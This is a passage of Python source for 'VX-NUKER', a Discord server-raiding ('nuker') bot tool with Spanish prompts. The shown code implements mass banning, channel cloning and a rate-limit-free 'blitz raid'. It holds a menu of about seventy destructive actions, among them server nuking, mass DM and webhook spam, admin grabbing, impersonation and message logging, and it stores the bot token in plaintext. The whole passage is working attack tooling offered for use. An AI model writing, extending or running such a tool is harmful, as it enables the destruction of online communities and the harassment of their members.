async def clone_channels(sid):
    g = _get_guild(sid)
    if not g: return
    _section("CLONAR CANALES")
    target_id = _ask("ID del servidor a clonar canales")
    try: target = bot.get_guild(int(target_id))
    except: return log_err("ID invalido")
    if not target: return log_err("bot no esta en ese servidor")
    chans = [c for c in target.channels if isinstance(c, (discord.TextChannel, discord.VoiceChannel))]
    log_info(f"{len(chans)} canales a clonar")
    if not _confirm("clonar canales"): return
    t = time.perf_counter(); ok = 0
    for ch in chans:
        try:
            if isinstance(ch, discord.TextChannel):
                await g.create_text_channel(ch.name)
            else:
                await g.create_voice_channel(ch.name)
            log_ok(f"canal {ch.name}"); ok += 1
        except: log_err(f"error {ch.name}")
        await _ssleep()
    _summary("Clone Chans", ok, len(chans)-ok, time.perf_counter()-t)

async def ban_bots(sid):
    g = _get_guild(sid)
    if not g: return
    _section("BANEAR BOTS")
    bots = [m for m in g.members if m.bot]
    if not bots: return log_info("no hay bots en este servidor")
    log_warn(f"{len(bots)} bots encontrados")
    if not _confirm(f"banear {len(bots)} bots"): return
    t = time.perf_counter()
    async def _b(m):
        try: await m.ban(reason=f"Baneado por VX-NUKER | {PUB_SHORT}"); log_ok(f"bot {m.name}"); return True
        except: log_err(f"error {m.name}"); return False
    r = await asyncio.gather(*[_b(m) for m in bots])
    _summary("Ban Bots", r.count(True), r.count(False), time.perf_counter()-t)

async def ban_by_id(sid):
    g = _get_guild(sid)
    if not g: return
    _section("BANEAR POR ID")
    ids_raw = _ask("IDs de usuarios separados por coma")
    ids = [i.strip() for i in ids_raw.split(",") if i.strip().isdigit()]
    if not ids: return log_err("IDs invalidos")
    log_info(f"{len(ids)} usuario(s) a banear")
    if not _confirm("banear estos usuarios"): return
    t = time.perf_counter(); ok = 0
    for uid in ids:
        try:
            user = await bot.fetch_user(int(uid))
            await g.ban(user, reason=f"Baneado por VX-NUKER | {PUB_SHORT}")
            log_ok(f"baneado {user.name} ({uid})"); ok += 1
        except discord.Forbidden: log_err(f"sin permiso para {uid}")
        except discord.NotFound: log_err(f"usuario {uid} no encontrado")
        except Exception as e: log_err(f"error {uid}: {_vis(str(e))}")
    _summary("Ban by ID", ok, len(ids)-ok, time.perf_counter()-t)

async def blitz_raid(sid):
    global _STEALTH_MODE, _STEALTH_DELAY
    old_stealth = _STEALTH_MODE
    old_delay = _STEALTH_DELAY
    _STEALTH_MODE = False
    _STEALTH_DELAY = (0, 0)
    await auto_raid(sid)
    _STEALTH_MODE = old_stealth
    _STEALTH_DELAY = old_delay

async def auto_status(sid):
    g = _get_guild(sid)
    if not g: return
    _section("STATUS AUTOMATICO")
    log_info("El bot cambiara su estado cada 10 segundos")
    log_info("Presiona ENTER para detener")
    statuses = [
        {"type": "playing", "text": f"VX-NUKER | {PUB_SHORT}"},
        {"type": "watching", "text": f"{g.member_count} miembros"},
        {"type": "listening", "text": "guns.lol/vxsociety"},
        {"type": "playing", "text": f"{len(g.channels)} canales"},
        {"type": "watching", "text": "VX SOCIETY"},
    ]
    global _stop_flag
    _stop_flag = False
    i = 0
    while not _stop_flag:
        try:
            s = statuses[i % len(statuses)]
            pt = getattr(ActivityType, s["type"], ActivityType.playing)
            await bot.change_presence(activity=Activity(type=pt, name=s["text"]))
            log_info(f"status: {s['text']}")
            i += 1
        except: pass
        for _ in range(100):
            if _stop_flag: break
            await asyncio.sleep(0.1)
    log_info("status automatico detenido")

def _actions(sid, bot_id):
    return {
        '01': lambda: nuke(sid),
        '02': lambda: auto_raid(sid),
        '03': lambda: ban_all(sid, bot_id),
        '04': lambda: kick_all(sid, bot_id),
        '05': lambda: mute_all(sid),
        '06': lambda: unban_all(sid),
        '07': lambda: delete_all_channels(sid),
        '08': lambda: delete_emojis(sid),
        '09': lambda: delete_stickers(sid),
        '10': lambda: create_channels(sid),
        '11': lambda: create_roles(sid),
        '12': lambda: category_creator(sid),
        '13': lambda: rename_all_channels(sid),
        '14': lambda: rename_all_roles(sid),
        '15': lambda: change_server(sid),
        '16': lambda: nick_all(sid),
        '17': lambda: dehoist_all(sid),
        '18': lambda: get_admin(sid),
        '19': lambda: impersonate(sid),
        '20': lambda: ghost_ping_all(sid),
        '21': lambda: strip_roles(sid),
        '22': lambda: dm_all(sid),
        '23': lambda: dm_spam_user(sid),
        '24': lambda: webhook_spam(sid),
        '25': lambda: server_info(sid),
        '26': lambda: clone_server(sid),
        '27': lambda: webhook_logger(sid),
        '28': lambda: lockdown(sid),
        '29': lambda: deafen_all(sid),
        '30': lambda: disconnect_all(sid),
        '31': lambda: mass_move(sid),
        '32': lambda: invite_spam(sid),
        '33': lambda: spam_channel(sid),
        '34': lambda: thread_spam(sid),
        '35': lambda: reaction_spam(sid),
        '36': lambda: vc_spam(sid),
        '37': lambda: spoiler_spam(sid),
        '38': lambda: poll_spam(sid),
        '39': lambda: event_spam(sid),
        '41': lambda: purge_messages(sid),
        '42': lambda: export_logs(sid),
        '43': lambda: channel_slowmode(sid),
        '44': lambda: webhook_nuke(sid),
        '45': lambda: role_all(sid),
        '46': lambda: channel_topic_spam(sid),
        '47': lambda: permission_override(sid),
        '48': lambda: steal_emojis(sid),
        '49': lambda: prune_members(sid),
        '51': lambda: raid_presets(sid),
        '52': lambda: scheduled_raid(sid),
        '53': lambda: stealth_toggle(sid),
        '54': lambda: server_nuke(sid),
        '55': lambda: forum_spam(sid),
        '56': lambda: stage_spam(sid),
        '57': lambda: restore_server(sid),
        '58': lambda: perms_nuke(sid),
        '59': lambda: icon_rotate(sid),
        '60': lambda: stats_view(sid),
        '61': lambda: delete_all_roles(sid),
        '62': lambda: delete_categories(sid),
        '63': lambda: rename_categories(sid),
        '64': lambda: clone_roles(sid),
        '65': lambda: clone_channels(sid),
        '66': lambda: ban_bots(sid),
        '67': lambda: ban_by_id(sid),
        '68': lambda: blitz_raid(sid),
        '69': lambda: auto_status(sid),
    }
def _boot():
    if os.name == 'nt':
        os.system('title VX-NUKER v1.0.0')
    else:
        sys.stdout.write('\033]0;VX-NUKER v1.0.0\007')
    _clr()
    try:
        ts = os.get_terminal_size()
        rows, cols = ts.lines - 1, ts.columns
    except:
        rows, cols = 30, 80
    dur = 1.4
    chars   = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@$%&*=#~<>{}[]"
    grad    = [R0, R1, R1, R2, R2, R3, R3, R4, R5]
    streams = [random.randint(0, rows) for _ in range(cols)]
    end, first = time.time()+dur, True
    sys.stdout.write("\033[?25l")
    while time.time() < end:
        lines = []
        for row in range(rows):
            line = ""
            for col in range(cols):
                dist = streams[col] - row
                if dist == 0:
                    line += f"{R0}{B}{random.choice(chars)}{RS}"
                elif 0 < dist < len(grad):
                    line += f"{grad[dist]}{random.choice(chars)}{RS}"
                else:
                    line += " "
            lines.append(line)
        if first: sys.stdout.write("\n"*rows); first = False
        sys.stdout.write(f"\033[{rows}A")
        for l in lines: sys.stdout.write(l+"\n")
        sys.stdout.flush()
        for col in range(cols):
            streams[col] = 0 if random.random()<.05 else streams[col]+1
            if streams[col] > rows + len(grad):
                streams[col] = random.randint(-6, 0)
        time.sleep(.04)
    sys.stdout.write("\033[?25h")
    _clr()
    _print_banner(animated=True)
    fx_load("loading modules", 24, .002)
    print()
    _flag = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".vx_first")
    if not os.path.exists(_flag):
        try:
            open(_flag, 'w').close()
            webbrowser.open(DISCORD_URL)
            time.sleep(.4)
            webbrowser.open(GITHUB_URL)
            time.sleep(.4)
            _star = os.path.join(os.path.dirname(os.path.abspath(__file__)), "star.PNG")
            if os.path.exists(_star): webbrowser.open(_star)
        except: pass

_boot()

_SESSION_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".vx_session.json")

def _load_session():
    try:
        with open(_SESSION_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def _save_session(token, sid):
    try:
        with open(_SESSION_FILE, "w", encoding="utf-8") as f:
            json.dump({"token": token, "server_id": sid}, f)
    except:
        pass

_prev = _load_session()
bot_token = ""
server_id = ""

if _prev.get("token") and _prev.get("server_id"):
    masked_tok = _prev["token"][:6] + "..." + _prev["token"][-4:]
    print(f"  {R3}┌{'─'*48}┐{RS}")
    print(f"  {R3}│{RS}  {WHT}{B}Previous Session{RS}{' '*30}{R3}│{RS}")
    print(f"  {R3}├{'─'*48}┤{RS}")
    print(f"  {R3}│{RS}  {GRY}token{RS}     {DIM}{masked_tok}{RS}")
    print(f"  {R3}│{RS}  {GRY}server{RS}    {DIM}{_prev['server_id']}{RS}")
    print(f"  {R3}└{'─'*48}┘{RS}")
    use_prev = input(f"\n  {R2}▸{RS} {wht('use previous session?')} {DIM}[yes/no]{RS} {D2}:{RS} ").strip().lower()
    if use_prev == "yes":
        bot_token = _prev["token"]
        server_id = _prev["server_id"]
        print(f"  {R1}◆{RS} {GRY}session restored{RS}\n")

if not bot_token or not server_id:
    print(f"  {R3}┌{'─'*48}┐{RS}")
    print(f"  {R3}│{RS}  {WHT}{B}Authentication{RS}{' '*32}{R3}│{RS}")
    print(f"  {R3}├{'─'*48}┤{RS}")
    bot_token = input(f"  {R3}│{RS}  {R1}▸{RS} {wht('token')}     {D2}:{RS} ").strip()
    server_id = input(f"  {R3}│{RS}  {R1}▸{RS} {wht('server id')} {D2}:{RS} ").strip()
    print(f"  {R3}└{'─'*48}┘{RS}\n")

if not bot_token or not server_id:
    print(f"  {R4}[×]{RS} {GRY}token and server ID required{RS}"); sys.exit(1)

_save_session(bot_token, server_id)

intents = discord.Intents.all()
bot     = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_connect():
    print(f"  {R1}[+]{RS} {WHT}Conexion establecida, cargando...{RS}")
    sys.stdout.flush()

@bot.event
async def on_ready():
    global server_id, bot_token, _stop_flag
    try:
        print(f"  {R2}[*]{RS} {WHT}on_ready disparado como: {bot.user} | servidores: {len(bot.guilds)}{RS}")
        sys.stdout.flush()
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(f"\n  {R3}[x]{RS} {WHT}Bot no encontrado en servidor ID: {server_id}{RS}")
            if bot.guilds:
                print(f"  {GRY}Servidores disponibles:{RS}")
                for g in bot.guilds:
                    print(f"    {DIM}· {g.name}  ({g.id}){RS}")
            else:
                print(f"  {R3}[!]{RS} {WHT}El bot no esta en NINGUN servidor.{RS}")
                print(f"  {GRY}Invita el bot al servidor con permisos de administrador.{RS}")
            print(f"\n  {GRY}Tambien verifica que 'SERVER MEMBERS INTENT' y 'MESSAGE CONTENT INTENT' esten activados en el portal de Discord Developer.{RS}\n")
            input(f"  {D2}[ enter para salir ]{RS}")
            await bot.close()
            return
        await _print_banner_async(bot.user.name, guild.name, guild.member_count, animated=True)
        fx_spin("authenticating", .7)
        log_ok(f"ready  {guild.name}  ({guild.member_count} members)")
        try:
            pt = getattr(ActivityType, BOT_PRESENCE["type"].lower(), ActivityType.playing)
            await bot.change_presence(activity=Activity(type=pt, name=BOT_PRESENCE["text"]))
        except: pass
    except Exception as _re:
        print(f"  {R3}[x]{RS} {WHT}Error en on_ready: {_re}{RS}")
        sys.stdout.flush()
        return

    acts = _actions(server_id, bot.user.id)
    page = 1

    while True:
        _clr()
        _print_banner(bot.user.name, guild.name, guild.member_count)
        _print_menu(page)
        raw = await asyncio.get_event_loop().run_in_executor(None, input, "")
        raw = raw.strip(); choice = raw.lower()

        if choice in ('q','quit','exit') or raw in ('40','70'):
            await quit_tool()
            break
        if choice in ('n','next') and page < 3: page += 1; continue
        if choice in ('b','back') and page > 1: page -= 1; continue

        if raw == '50':
            await change_server_target(server_id)
        elif raw.isdigit() and 51 <= int(raw) <= 69:
            _clr()
            _print_banner(bot.user.name, guild.name, guild.member_count)
            print()
            _stop_flag = False
            main_task = asyncio.create_task(acts[raw]())
            cancel_task = asyncio.create_task(_cancel_waiter())
            done, pending = await asyncio.wait([main_task, cancel_task], return_when=asyncio.FIRST_COMPLETED)
            for t in pending: t.cancel()
            try:
                if main_task in done: await main_task
            except Exception as e: log_err(_vis(str(e)))
        elif raw in acts:
            _clr()
            _print_banner(bot.user.name, guild.name, guild.member_count)
            print()
            _stop_flag = False
            main_task = asyncio.create_task(acts[raw]())
            cancel_task = asyncio.create_task(_cancel_waiter())
            done, pending = await asyncio.wait([main_task, cancel_task], return_when=asyncio.FIRST_COMPLETED)
            for t in pending:
                t.cancel()
            try:
                if main_task in done:
                    await main_task
            except Exception as e:
                log_err(_vis(str(e)))
        elif raw:
            log_err(f"unknown  {raw}")

        print()
        await asyncio.get_event_loop().run_in_executor(None, input, f"  {D2}[ enter ]{RS}")

@bot.event
async def on_message(message: discord.Message):
    await webhook_logger_check(message)
    await bot.process_commands(message)

if __name__ == "__main__":
    print(f"\n  {R2}[*]{RS} {WHT}Conectando con Discord...{RS} {DIM}(puede tardar unos segundos){RS}\n")
    sys.stdout.flush()
    try:
        bot.run(bot_token, log_handler=None)
    except discord.LoginFailure:
        print(f"\n  {R3}[x]{RS} {WHT}Token invalido o expirado. Borra .vx_session.json y vuelve a ejecutar.{RS}\n")
        sys.exit(1)
    except Exception as _e:
        print(f"\n  {R3}[x]{RS} {WHT}Error al conectar: {_e}{RS}\n")
        sys.exit(1)
